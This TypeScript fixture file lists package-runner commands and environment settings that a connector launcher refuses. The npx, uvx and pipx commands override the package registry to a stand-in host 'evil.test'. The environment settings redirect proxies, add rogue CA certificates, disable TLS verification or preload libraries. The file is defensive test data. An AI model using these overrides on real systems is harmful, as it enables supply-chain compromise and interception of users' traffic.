import type { ConnectorPin } from "@halonicjs/ports";

/**
 * A pinned command that names the pin's own package, but with a runner
 * option that could fetch it from somewhere other than the pin's registry.
 */
export interface OverridingCommand {
  registry: ConnectorPin["registry"];
  command: string;
  args: readonly string[];
}

/**
 * Pinned commands `app.package-runner-launch` refuses because of a registry
 * option: written with `=` or a space, in another case, after the package,
 * as an npm scope's registry, and behind a shell.
 */
export const overridingCommands: readonly OverridingCommand[] = [
  {
    registry: "npm",
    command: "npx",
    args: ["--registry=https://evil.test", "-y", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["--registry", "https://evil.test", "-y", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["--REGISTRY=https://evil.test", "-y", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["-y", "@acme/mail-mcp", "--registry=https://evil.test"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["--@acme:registry=https://evil.test", "-y", "@acme/mail-mcp"],
  },
  {
    registry: "npm",
    command: "npx",
    args: ["--userconfig", "./evil.npmrc", "-y", "@acme/mail-mcp"],
  },
  { registry: "npm", command: "npx", args: ["--cache", "./evil-cache", "-y", "@acme/mail-mcp"] },
  {
    registry: "npm",
    command: "cmd",
    args: ["/c", "npx --registry=https://evil.test -y @acme/mail-mcp"],
  },
  {
    registry: "pypi",
    command: "uvx",
    args: ["--index-url", "https://evil.test/simple", "mail-mcp"],
  },
  { registry: "pypi", command: "uvx", args: ["-i", "https://evil.test/simple", "mail-mcp"] },
  {
    registry: "pypi",
    command: "uvx",
    args: ["--extra-index-url=https://evil.test/simple", "mail-mcp"],
  },
  {
    registry: "pypi",
    command: "uvx",
    args: ["--default-index", "https://evil.test/simple", "mail-mcp"],
  },
  { registry: "pypi", command: "uvx", args: ["--find-links", "./wheels", "mail-mcp"] },
  {
    registry: "pypi",
    command: "pipx",
    args: ["run", "--pip-args=--index-url=https://evil.test/simple", "mail-mcp"],
  },
];

/**
 * A connector `env` setting one proxy, certificate or preload variable, in
 * the case it is written, which `app.package-runner-launch` refuses for a
 * pinned connector.
 */
export const overridingEnv: readonly Readonly<Record<string, string>>[] = [
  { HTTPS_PROXY: "http://evil.test:8080" },
  { http_proxy: "http://evil.test:8080" },
  { ALL_PROXY: "socks5://evil.test:1080" },
  { NODE_EXTRA_CA_CERTS: "./evil-ca.pem" },
  { NODE_TLS_REJECT_UNAUTHORIZED: "0" },
  { SSL_CERT_FILE: "./evil-ca.pem" },
  { REQUESTS_CA_BUNDLE: "./evil-ca.pem" },
  { LD_PRELOAD: "./evil.so" },
  { DYLD_INSERT_LIBRARIES: "./evil.dylib" },
];
